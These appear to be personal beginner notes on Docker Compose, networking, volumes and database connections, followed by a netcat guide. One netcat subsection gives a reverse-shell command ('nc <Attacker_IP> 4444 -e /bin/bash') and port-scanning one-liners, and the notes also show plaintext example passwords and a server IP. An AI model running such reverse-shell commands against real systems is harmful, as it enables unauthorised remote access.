# Docker Compose Tutorial for Beginners – Notes

## Introduction to Docker Compose
Docker Compose simplifies the management of multi-container applications.
Uses a docker-compose.yml file to define services, networks, and volumes.
Helps manage multiple containers with a single command (docker-compose up).

### Docker Networking:
- To check network: docker network ls
- To inspect: docker inspect [Network Name] 
  - ex: docker inspect bridge

when we inspect we can see its subnet and getway ip of driver.

There are many types of Networking mostly used bridge (We can create our own bridge and attache to 
container then we can use container name to access the othe container using HTTP request.)

## Docker Networking & Common Commands (Cheat Sheet)

---

### 1. Docker Networking Overview
Docker provides different types of networks to enable communication between containers, the host machine, and external networks.

#### Default Docker Networks (`docker network ls`)
- **bridge**: Default network for containers. Containers can communicate only if they are on the same bridge network.
- **host**: Removes network isolation, allowing the container to use the host's network. No need for port mapping (`-p`).
- **none**: Completely disables networking.
- **overlay**: Used in Docker Swarm for multi-host container networking.
- **macvlan**: Assigns a MAC address to the container, making it appear as a physical device on the network.

#### Common Networking Commands
- List networks:
  docker network ls

- Create a custom network:
  docker network create my-custom-net

- Inspect a network:
  docker network inspect my-custom-net

- Connect a running container to a network:
  docker network connect my-custom-net my-container

- Disconnect a container from a network:
  docker network disconnect my-custom-net my-container

- Remove a network:
  docker network rm my-custom-net


---

### 2. Example: Running Containers in a Custom Networ
# Create a custom network
docker network create my-net

# Run two containers in the same network
docker run -d --name app --network my-net nginx
docker run -d --name db --network my-net mysql

# Now 'app' and 'db' can communicate using container names (DNS resolution)

---

### 3. Most Used Docker Commands & Flags

#### Basic Commands
- Show running containers:
  docker ps

- Show all containers (including stopped ones):
  docker ps -a

- List all Docker images:
  docker images

- Remove a container:
  docker rm <container>

- Remove an image:
  docker rmi <image>

- Stop a running container:
  docker stop <container>

- Start a stopped container:
  docker start <container>


#### Important Docker Run Flags
| Flag | Description | Example |
|------|-------------|---------|
| `--name` | Assign a name to the container. | `docker run --name my-container ubuntu` |
| `--rm` | Automatically remove the container when it stops. | `docker run --rm ubuntu` |
| `-d` | Run the container in detached (background) mode. | `docker run -d nginx` |
| `-e` | Set environment variables. | `docker run -e MYSQL_ROOT_PASSWORD=1234 mysql` |
| `-p` | Map ports between host and container. | `docker run -p 8080:80 nginx` |
| `-v` | Mount a volume. | `docker run -v /mydata:/data ubuntu` |
| `--network` | Connect container to a specific network. | `docker run --network my-net alpine` |

---

### 4. Example: Running a Container with Multiple Flag
docker run -d --rm --name my-nginx \
  -p 8080:80 \
  -e NGINX_PORT=80 \
  --network my-net \
  nginx

**Explanation:**
- `-d` → Runs in the background.
- `--rm` → Auto-removes the container after stopping.
- `--name my-nginx` → Assigns the name `my-nginx`.
- `-p 8080:80` → Maps port `8080` on the host to `80` inside the container.
- `-e NGINX_PORT=80` → Sets an environment variable.
- `--network my-net` → Connects to the `my-net` network.

---

## Docker Bridge Network Examples

### 1. Default Bridge Network
By default, Docker assigns containers to the `bridge` network. However, these containers **cannot communicate** with each other using their names.

#### Example: Running Containers in Default Bridge Network
# Run two containers without a custom network
docker run -d --name container1 busybox sleep 1000
docker run -d --name container2 busybox sleep 1000

Now, try to ping `container2` from `container1`:
docker exec -it container1 ping container2

🔴 **This will fail** because the default `bridge` network **does not support container name resolution**. 
We need to use ip address of container like http://172.50.10.2:8080 to make request to other container from one conatainer.
To solve this we use custom bridge network, we connect all services to this and cumminicate ustom bridge network only using their name

---

### 2. Creating a Custom Bridge Network
A **custom bridge network** allows containers to communicate using their names.

#### Example: Setting Up a Custom Bridge Network
# Create a custom bridge network
docker network create my-bridge-net

# Run two containers in the same network
```sh
docker run -d --name container1 --network my-bridge-net -p 8080:8080 node-backend
docker run -d --name container2 --network my-bridge-net -p 8081:8080 node-backend
```

Now we can use name to communicate between them

Now, try to ping `container2` from `container1`:

```sh
docker exec -it container1 sh
curl http://container2:8080/api/v1
```

Now, try to ping `container1` from `container2`:
docker exec -it container2 sh
```sh
curl http://container1:8080/api/v1
```

✅ **This will work** because `my-bridge-net` enables name-based communication.

---

### 3. Inspecting a Bridge Network
To see details of your custom bridge network:
```sh
docker network inspect my-bridge-net
```

This shows connected containers and network configurations.

---

### 4. Connecting an Existing Container to a Bridge Network
If a container is already running, you can attach it to a custom bridge network:
```sh
docker network connect my-bridge-net container1
```

---

### 5. Disconnecting a Container from a Network
```sh
docker network disconnect my-bridge-net container1
```

---

### 6. Removing a Custom Bridge Network
First, stop any connected containers:
docker stop container1 container2
docker rm container1 container2

Then, remove the network:
```sh
docker network rm my-bridge-net
```

---

```sh
docker run --name node-docker-container -d -e PORT=8080 -p 8080:8090 --rm  ajayjb/node-docker
```

we dont need to give all above flags, we use docker compose 

---

This setup ensures containers within the same **custom bridge network** can communicate using their **names**, improving flexibility and isolation

Volumes in Doker : ----

1. Bind mounts
2. Using volumes

# Docker Volumes

## What are Docker Volumes?
Docker volumes are a way to persist data generated and used by Docker containers. Unlike bind mounts, which map a specific host directory to a container, volumes are managed entirely by Docker and provide better performance and flexibility.

## Why Use Docker Volumes?
1. **Data Persistence**: Volumes allow data to persist even if the container is stopped or removed.
2. **Container Independence**: Volumes can be used across multiple containers.
3. **Better Performance**: Compared to bind mounts, volumes are optimized for Docker’s storage backend.
4. **Backup & Restore**: Easily back up and restore container data.
5. **Security & Isolation**: Volumes are managed separately from host files, improving security.

## Types of Docker Volumes
1. **Named Volumes**: Created and managed by Docker. Stored in Docker’s storage directory (e.g., `/var/lib/docker/volumes/`).
2. **Anonymous Volumes**: Created when a container needs persistent storage but no specific volume is specified.
3. **Bind Mounts**: Maps a host directory to a container directory. Not managed by Docker and may pose security risks.
4. **Tmpfs Mounts**: Stored in RAM, used for temporary data storage in Linux-based containers.

## Managing Docker Volumes
### Creating a Volume
```sh
docker volume create my_volume
```

### Listing Volumes
```sh
docker volume ls
```

### Inspecting a Volume
```sh
docker volume inspect my_volume
```

### Removing a Volume
```sh
docker volume rm my_volume
```

### Removing All Unused Volumes
```sh
docker volume prune
```

## Using Volumes in Containers
### Mounting a Volume in a Container
```sh
docker run -d --name my_container -v my_volume:/data my_image
```
This mounts `my_volume` to `/data` inside the container.

### Using Bind Mounts
```sh
docker run -d --name my_container -v /host/path:/container/path my_image
```

### Read-Only Volumes
```sh
docker run -d --name my_container -v my_volume:/data:ro my_image
The `:ro` flag makes the volume read-only.
```

---

## Using Volumes in Docker Compose
Docker Compose allows defining and managing volumes within a `docker-compose.yml` file.

### Defining Volumes in `docker-compose.yml`yaml
```yml
version: '3.8'
services:
  app:
    image: my_image
    volumes:
      - my_volume:/data
  db:
    image: postgres
    volumes:
      - db_data:/var/lib/postgresql/data
volumes:
  my_volume:
  db_data:
```

### Running Docker Compose with Volumes
```sh
docker-compose up -d
```
This starts the services and ensures volumes are created and attached.

### Listing Volumes in Docker Compose
```sh
docker volume ls
```

### Removing Docker Compose Volumes
```sh
docker-compose down -v
```
This removes containers, networks, and volumes defined in `docker-compose.yml`.

## Backing Up and Restoring Volumes
### Backup a Volume
```sh
docker run --rm -v my_volume:/data -v $(pwd):/backup busybox tar czf /backup/backup.tar.gz -C /data .
```

### Restore a Volume
```sh
docker run --rm -v my_volume:/data -v $(pwd):/backup busybox tar xzf /backup/backup.tar.gz -C /data
```

## Conclusion
Docker volumes are essential for managing persistent data in containerized applications. They offer flexibility, security, and ease of use compared to traditional file-mounting techniques. Understanding how to create, use, and manage volumes efficiently can significantly enhance Docker’s capabilities in production environments.


connect to mongo container
From Inside container
```sh
mongosh --username "test_user" --password "Admin@123" --authenticationDatabase "admin"  --host "localhost" --port 27017
mongosh --username "test_user" --password "Admin@123" --authenticationDatabase "admin"
```

If container with port mapping is 5005:27017
- Connect From Outside
```sh
 mongosh mongodb://test_user:Admin@123@localhost:5005/?authSource=admin
```
- Connect inside the same network if service name in mongo
```sh
 mongosh mongodb://test_user:Admin@123@mongo:27017/?authSource=admin
```

psql commands :---

```sh
create user backend_user with encrypted password 'devopsPg123';
grant all privileges on database mydb to backend_user;
grant all privileges on all tables in schema public to backend_user;
grant all privileges on all sequences in schema public to backend_user;
```

Netcat (`nc`) is a versatile networking tool used for reading from and writing to network connections. You can use it for port scanning, file transfers, simple chat servers, and more.

### Basic Usage
#### 1. Check if Netcat is Installedsh

```sh
nc -h
```

If not installed, install it using:
- **Ubuntu/Debian**: `sudo apt install netcat`
- **CentOS/RHEL**: `sudo yum install nc`
- **MacOS**: `brew install netcat`
- **Windows**: Use Ncat (comes with Nmap)

#### 2. Simple TCP Server & Client
- Start a listener on port 1234:
```sh
sh
  nc -l 1234
```

- Connect to the listener from another terminal or machine:
```sh
sh
  nc <server-ip> 1234
```

#### 3. Transfer a File
- On the sender side:
```sh
sh
  cat file.txt | nc <receiver-ip> 1234
```

- On the receiver side:
```sh
sh
  nc -l 1234 > received.txt
```

#### 4. Port Scanningsh
```sh
nc -zv <target-ip> 20-1000
```

(`-z` = scan without sending data, `-v` = verbose mode)

#### 5. Send HTTP Request Manuallysh
```sh
echo -e "GET / HTTP/1.1\nHost: example.com\n\n" | nc example.com 80
```

This guide provides a basic overview of Netcat usage. Modify commands as needed for your use case.

**Netcat (nc) Usage Guide**

Netcat (`nc`) is a powerful networking tool for reading from and writing to network connections using TCP or UDP.

---

### **1. Check if a Port is Open**
```sh
nc -zv <hostname or IP> <port>
```
Example:
```sh
nc -zv google.com 443
```
This checks if port 443 is open on google.com.

---

### **2. Simple Chat Between Two Machines**
#### On Machine 1 (Start a listener on port 1234):
```sh
nc -l -p 1234
```
#### On Machine 2 (Connect to Machine 1):
```sh
nc <Machine1_IP> 1234
```
Now, both machines can send and receive messages.

---

### **3. Transfer Files Over Network**
#### On Sender Machine:
```sh
cat file.txt | nc <Receiver_IP> 1234
```
#### On Receiver Machine:
```sh
nc -l -p 1234 > received.txt
```
---

### **4. Create a Simple Web Server**
```sh
echo -e "HTTP/1.1 200 OK\n\nHello, World!" | nc -l -p 8080
```
Now, opening `http://localhost:8080` in a browser will display "Hello, World!".

---

### **5. Scan for Open Ports on a Remote Host**
```sh
nc -z -v <hostname or IP> 20-1000
```
Scans ports 20 to 1000 and lists the open ones.

---

### **6. Establish a Reverse Shell (for Penetration Testing)**
#### On Attacker Machine (Listening Mode):
```sh
nc -l -p 4444 -e /bin/bash
```
#### On Victim Machine (Initiate Connection):
```sh
nc <Attacker_IP> 4444 -e /bin/bash
```
The attacker gains a shell on the victim's machine.

---

### **7. Send HTTP Request Using netcat**
```sh
echo -e "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n" | nc example.com 80
```
Sends an HTTP request to `example.com` and prints the response.

---

Netcat is a versatile tool useful for networking, troubleshooting, and penetration testing.

```sh
curl -X GET "http://node-app:8080/about"
```


```sh
curl -X POST "http://node-app:8080/post"
```

## STAGING in nginx certbot environment

1 means we use letsencrypt testing envriroment issue certificate, 0 means production cerficates are limited in this production envriroment

```sh
rsync -avz --exclude="**/node_modules/" --exclude=".git" -e "ssh -i ~/Documents/practice-projects/aws/docker-node.pem" . ubuntu@13.201.227.214:/var/www/docker-learn
```


